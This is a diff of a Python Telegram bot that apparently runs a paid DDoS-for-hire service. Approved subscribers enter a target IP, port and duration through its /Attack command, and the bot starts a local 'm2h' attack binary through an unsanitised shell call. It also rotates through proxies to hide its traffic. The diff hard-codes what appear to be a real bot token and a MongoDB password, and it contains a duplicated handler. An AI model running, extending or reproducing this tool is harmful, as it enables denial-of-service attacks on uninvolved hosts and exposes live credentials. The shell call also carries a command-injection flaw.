@@ -7,61 +7,236 @@ import time
 from pymongo import MongoClient
 from datetime import datetime, timedelta
 import certifi
-import asyncio
-from telebot.types import ReplyKeyboardMarkup, KeyboardButton
+import random
+from subprocess import Popen
 from threading import Thread
+import asyncio
+import aiohttp
+from telebot.types import ReplyKeyboardMarkup, KeyboardButton
 
 loop = asyncio.get_event_loop()
 
-# Token and Database Configurations
-TOKEN = 'your-telegram-bot-token'
-MONGO_URI = 'your-mongo-uri'
-FORWARD_CHANNEL_ID = -1001970210072
-CHANNEL_ID = -1001970210072
-error_channel_id = -1001970210072
+TOKEN = '7649422135:AAEJNfiU06ziy7O97HTfYUYWjrVuTfAzEf8'
+MONGO_URI = 'mongodb+srv://Soul:JYAuvlizhw7wqLOb@soul.tsga4.mongodb.net'
+FORWARD_CHANNEL_ID = -1002272999849
+CHANNEL_ID = -1002272999849
+error_channel_id = -1002272999849
 
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
 client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
-db = client['zoya']
+db = client['soul']
 users_collection = db.users
 
 bot = telebot.TeleBot(TOKEN)
 REQUEST_INTERVAL = 1
 
-blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
+blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]  # Blocked ports list
 
-running_processes = []
+async def start_asyncio_thread():
+    asyncio.set_event_loop(loop)
+    await start_asyncio_loop()
 
-REMOTE_HOST = '4.213.71.147'
+def update_proxy():
+    proxy_list = [
+        "https://43.134.234.74:443", "https://175.101.18.21:5678", "https://179.189.196.52:5678", 
+        "https://162.247.243.29:80", "https://173.244.200.154:44302", "https://173.244.200.156:64631", 
+        "https://207.180.236.140:51167", "https://123.145.4.15:53309", "https://36.93.15.53:65445", 
+        "https://1.20.207.225:4153", "https://83.136.176.72:4145", "https://115.144.253.12:23928", 
+        "https://78.83.242.229:4145", "https://128.14.226.130:60080", "https://194.163.174.206:16128", 
+        "https://110.78.149.159:4145", "https://190.15.252.205:3629", "https://101.43.191.233:2080", 
+        "https://202.92.5.126:44879", "https://221.211.62.4:1111", "https://58.57.2.46:10800", 
+        "https://45.228.147.239:5678", "https://43.157.44.79:443", "https://103.4.118.130:5678", 
+        "https://37.131.202.95:33427", "https://172.104.47.98:34503", "https://216.80.120.100:3820", 
+        "https://182.93.69.74:5678", "https://8.210.150.195:26666", "https://49.48.47.72:8080", 
+        "https://37.75.112.35:4153", "https://8.218.134.238:10802", "https://139.59.128.40:2016", 
+        "https://45.196.151.120:5432", "https://24.78.155.155:9090", "https://212.83.137.239:61542", 
+        "https://46.173.175.166:10801", "https://103.196.136.158:7497", "https://82.194.133.209:4153", 
+        "https://210.4.194.196:80", "https://88.248.2.160:5678", "https://116.199.169.1:4145", 
+        "https://77.99.40.240:9090", "https://143.255.176.161:4153", "https://172.99.187.33:4145", 
+        "https://43.134.204.249:33126", "https://185.95.227.244:4145", "https://197.234.13.57:4145", 
+        "https://81.12.124.86:5678", "https://101.32.62.108:1080", "https://192.169.197.146:55137", 
+        "https://82.117.215.98:3629", "https://202.162.212.164:4153", "https://185.105.237.11:3128", 
+        "https://123.59.100.247:1080", "https://192.141.236.3:5678", "https://182.253.158.52:5678", 
+        "https://164.52.42.2:4145", "https://185.202.7.161:1455", "https://186.236.8.19:4145", 
+        "https://36.67.147.222:4153", "https://118.96.94.40:80", "https://27.151.29.27:2080", 
+        "https://181.129.198.58:5678", "https://200.105.192.6:5678", "https://103.86.1.255:4145", 
+        "https://171.248.215.108:1080", "https://181.198.32.211:4153", "https://188.26.5.254:4145", 
+        "https://34.120.231.30:80", "https://103.23.100.1:4145", "https://194.4.50.62:12334", 
+        "https://201.251.155.249:5678", "https://37.1.211.58:1080", "https://86.111.144.10:4145", 
+        "https://80.78.23.49:1080"
+    ]
+    proxy = random.choice(proxy_list)
+    telebot.apihelper.proxy = {'https': proxy}
+    logging.info("Proxy updated successfully.")
 
-# Bot commands and message handling
+@bot.message_handler(commands=['update_proxy'])
+def update_proxy_command(message):
+    chat_id = message.chat.id
+    try:
+        update_proxy()
+        bot.send_message(chat_id, "Proxy updated successfully.")
+    except Exception as e:
+        bot.send_message(chat_id, f"Failed to update proxy: {e}")
+
+async def start_asyncio_loop():
+    while True:
+        await asyncio.sleep(REQUEST_INTERVAL)
+
+async def run_attack_command_async(target_ip, target_port, duration):
+    process = await asyncio.create_subprocess_shell(f"./m2h {target_ip} {target_port} {duration}")
+    await process.communicate()
+
+def is_user_admin(user_id, chat_id):
+    try:
+        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
+    except:
+        return False
+
+@bot.message_handler(commands=['approve', 'disapprove'])
+def approve_or_disapprove_user(message):
+    user_id = message.from_user.id
+    chat_id = message.chat.id
+    is_admin = is_user_admin(user_id, CHANNEL_ID)
+    cmd_parts = message.text.split()
+
+    if not is_admin:
+        bot.send_message(chat_id, "*You Rre Not Authorized To Use This Command*", parse_mode='Markdown')
+        return
+
+    if len(cmd_parts) < 2:
+        bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days> or /disapprove <user_id>.*", parse_mode='Markdown')
+        return
+
+    action = cmd_parts[0]
+    target_user_id = int(cmd_parts[1])
+    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
+    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0
+
+    if action == '/approve':
+        if plan == 1:  # Instant Plan 🧡
+            if users_collection.count_documents({"plan": 1}) >= 99:
+                bot.send_message(chat_id, "*Approval Failed: Basic Plan 😈 Limit Reached (99 Users).*", parse_mode='Markdown')
+                return
+        elif plan == 2:  # Instant++ Plan 💥
+            if users_collection.count_documents({"plan": 2}) >= 499:
+                bot.send_message(chat_id, "*Approval Failed: VIP Plan 🥶 Limit Reached (499 Users).*", parse_mode='Markdown')
+                return
+
+        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
+        users_collection.update_one(
+            {"user_id": target_user_id},
+            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
+            upsert=True
+        )
+        msg_text = f"*User {target_user_id} approved with plan {plan} for {days} days.*"
+    else:  # disapprove
+        users_collection.update_one(
+            {"user_id": target_user_id},
+            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
+            upsert=True
+        )
+        msg_text = f"*User {target_user_id} disapproved and reverted to free.*"
+
+    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
+    bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')
+@bot.message_handler(commands=['Attack'])
+def attack_command(message):
+    user_id = message.from_user.id
+    chat_id = message.chat.id
+
+    try:
+        user_data = users_collection.find_one({"user_id": user_id})
+        if not user_data or user_data['plan'] == 0:
+            bot.send_message(chat_id, "You Are Not Authorized By Owner To Use This Bot Please Contact To Owner @m2hgamerz")
+            return
+
+        if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
+            bot.send_message(chat_id, "Your Basic Plan 😈 Is Currently Not Available Duo To Limite Reach..")
+            return
+
+        if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 499:
+            bot.send_message(chat_id, "Your VIP Plan 🥶 Is Currently Not Available Duo To Limite Reach.")
+            return
+
+        bot.send_message(chat_id, "Enter The Target IP, PORT, TIME In (Seconds) With Spaces ☠️😋.")
+        bot.register_next_step_handler(message, process_attack_command)
+    except Exception as e:
+        logging.error(f"Error in attack command: {e}")
+
+@bot.message_handler(commands=['Attack'])
+def attack_command(message):
+    user_id = message.from_user.id
+    chat_id = message.chat.id
+
+    try:
+        user_data = users_collection.find_one({"user_id": user_id})
+        if not user_data or user_data['plan'] == 0:
+            bot.send_message(chat_id, "*You Are Not Approved By Owner Please Contact To Owner*", parse_mode='Markdown')
+            return
+
+        if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
+            bot.send_message(chat_id, "*Your Basic Plan 😈 Is Currently Not Available Duo To Limite Reach.*", parse_mode='Markdown')
+            return
+
+        if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 499:
+            bot.send_message(chat_id, "*Your VIP Plan 🥶 Is Currently Not Available Duo To Limite Reach.*", parse_mode='Markdown')
+            return
+
+        bot.send_message(chat_id, "*Enter The Target IP, PORT, TIME In (Seconds) With Spaces ☠️😋*", parse_mode='Markdown')
+        bot.register_next_step_handler(message, process_attack_command)
+    except Exception as e:
+        logging.error(f"Error in attack command: {e}")
+
+def process_attack_command(message):
+    try:
+        args = message.text.split()
+        if len(args) != 3:
+            bot.send_message(message.chat.id, "*Invalid command format. Please use: /Attack target_ip target_port time*", parse_mode='Markdown')
+            return
+        target_ip, target_port, duration = args[0], int(args[1]), args[2]
+
+        if target_port in blocked_ports:
+            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
+            return
+
+        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
+        bot.send_message(message.chat.id, f"*Attack started 💥\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration}*", parse_mode='Markdown')
+    except Exception as e:
+        logging.error(f"Error in processing attack command: {e}")
+
+def start_asyncio_thread():
+    asyncio.set_event_loop(loop)
+    loop.run_until_complete(start_asyncio_loop())
+
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
+    # Create a markup object
     markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
-    
-    btn1 = KeyboardButton("Subscribe to Instant Plan 😇")
-    btn2 = KeyboardButton("Subscribe to Instant++ Plan 😇😇")
-    btn3 = KeyboardButton("Download Canary Version ✅")
-    btn4 = KeyboardButton("View My Account Details🏦")
-    btn5 = KeyboardButton("Get Assistance❓")
-    btn6 = KeyboardButton("Contact Support✔️")
-    btn7 = KeyboardButton("Bot Owner: @m2hgamerz")
 
-    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7)
-    
-    bot.send_message(message.chat.id, "Welcome to the system! Please select one of the options below to continue:", reply_markup=markup)
+    # Create buttons
+    btn1 = KeyboardButton("Basic Plan 😈")
+    btn2 = KeyboardButton("VIP Plan 🥶")
+    btn3 = KeyboardButton("Download Canary App ✅")
+    btn4 = KeyboardButton("My Account🏦")
+    btn5 = KeyboardButton(" Any Help❓")
+    btn6 = KeyboardButton("Contact Owner 👀")
+
+    # Add buttons to the markup
+    markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
+
+    bot.send_message(message.chat.id, "*Please Select An Option For Using This Bot 🙃🙃*", reply_markup=markup, parse_mode='Markdown')
 
 @bot.message_handler(func=lambda message: True)
 def handle_message(message):
-    if message.text == "Subscribe to Instant Plan 😇":
-        bot.reply_to(message, "You have successfully subscribed to the *Instant Plan*. Enjoy the benefits!", parse_mode='Markdown')
-    elif message.text == "Subscribe to Instant++ Plan 😇😇":
-        bot.reply_to(message, "You have successfully subscribed to the *Instant++ Plan*. The premium features are now available!", parse_mode='Markdown')
-        # You can call the attack command here if needed
-    elif message.text == "Download Canary Version ✅":
-        bot.send_message(message.chat.id, "Click the following link to download the Canary version:\nhttps://t.me/c/1970210072/488", parse_mode='Markdown')
-    elif message.text == "View My Account Details🏦":
+    if message.text == "Basic Plan 😈":
+        bot.reply_to(message, "*You Selected BasicPlan 😈*", parse_mode='Markdown')
+    elif message.text == "VIP Plan 🥶":
+        bot.reply_to(message, "*You Selected VIP Plan 🥶*", parse_mode='Markdown')
+        attack_command(message)
+    elif message.text == "Canary Download✔️":
+        bot.send_message(message.chat.id, "*Here Is The Link 🔗 For Canary Download: https://t.me/c/1970210072/488*", parse_mode='Markdown')
+    elif message.text == "My Account🏦":
         user_id = message.from_user.id
         user_data = users_collection.find_one({"user_id": user_id})
         if user_data:
@@ -69,51 +244,28 @@ def handle_message(message):
             plan = user_data.get('plan', 'N/A')
             valid_until = user_data.get('valid_until', 'N/A')
             current_time = datetime.now().isoformat()
-            response = (f"*Account Information:*\n"
-                        f"Username: {username}\n"
-                        f"Subscription Plan: {plan}\n"
+            response = (f"*USERNAME: {username}\n"
+                        f"Plan: {plan}\n"
                         f"Valid Until: {valid_until}\n"
-                        f"Current Time: {current_time}")
+                        f"Current Time: {current_time}*")
         else:
-            response = "We couldn't find your account details. Please contact support for assistance."
+            response = "*No account information found. Please contact the administrator.*"
         bot.reply_to(message, response, parse_mode='Markdown')
-    elif message.text == "Get Assistance❓":
-        help_text = """
-Here is an explanation of the available commands:
-
-1. **Subscribe to Instant Plan 😇**: This option allows you to subscribe to the Instant Plan, giving you access to basic features of the bot.
-2. **Subscribe to Instant++ Plan 😇😇**: This plan provides you with advanced features, unlocking premium functionalities within the bot.
-3. **Download Canary Version ✅**: Use this command to download the Canary Version of the system. It provides early access to new features.
-4. **View My Account Details🏦**: Displays your current subscription status, the plan you're enrolled in, and other account details.
-5. **Get Assistance❓**: You are here! This option gives you a brief overview of the available commands.
-6. **Contact Support✔️**: If you need further help, you can contact the support team directly for any assistance or queries.
-7. **Bot Owner: @m2hgamerz**: Learn more about the bot owner, M2H, and contact him for further information.
-        """
-        bot.reply_to(message, help_text, parse_mode='Markdown')
-    elif message.text == "Contact Support✔️":
-        bot.reply_to(message, "You can contact our support team directly by messaging @admin_username.", parse_mode='Markdown')
-    elif message.text == "Bot Owner: @m2hgamerz":
-        bot.reply_to(message, "This bot is managed by M2H (@m2hgamerz). For any queries or concerns, feel free to reach out.", parse_mode='Markdown')
+    elif message.text == "Help❓":
+        bot.reply_to(message, "*Here is an explanation of the available commands :: 1. Subscribe to Instant Plan 😇: This option allows you to subscribe to the Instant Plan, giving you access to basic features of the bot. 2. Subscribe to Instant++ Plan 😇😇: This plan provides you with advanced features, unlocking premium functionalities within the bot. 3. Download Canary Version ✅: Use this command to download the Canary Version of the system. It provides early access to new features. 4. View My Account Details🏦: Displays your current subscription status, the plan you're enrolled in, and other account details. 5. Get Assistance❓: You are here! This option gives you a brief overview of the available commands. 6. Contact Support✔️: If you need further help, you can contact the support team directly for any assistance or queries. 7. Bot Owner: @m2hgamerz: Learn more about the bot owner, M2H, and contact him for further information.*", parse_mode='Markdown')
+    elif message.text == "Contact admin✔️":
+        bot.reply_to(message, "*Owner : @m2hgamerz*", parse_mode='Markdown')
     else:
-        bot.reply_to(message, "Sorry, the option you selected is not valid. Please use the menu to choose a valid action.", parse_mode='Markdown')
+        bot.reply_to(message, "*Invalid option*", parse_mode='Markdown')
 
-# Function to start asyncio loop in a separate thread
-def start_asyncio_thread():
-    asyncio.set_event_loop(loop)
-    loop.run_until_complete(start_asyncio_loop())
-
-async def start_asyncio_loop():
-    while True:
-        await asyncio.sleep(REQUEST_INTERVAL)
-
-# Running the bot
 if __name__ == "__main__":
     asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
     asyncio_thread.start()
-    logging.info("Bot is now running...")
+    logging.info("Starting Codespace activity keeper and Telegram bot...")
     while True:
         try:
             bot.polling(none_stop=True)
         except Exception as e:
-            logging.error(f"Error occurred during polling: {e}")
+            logging.error(f"An error occurred while polling: {e}")
+        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
         time.sleep(REQUEST_INTERVAL)
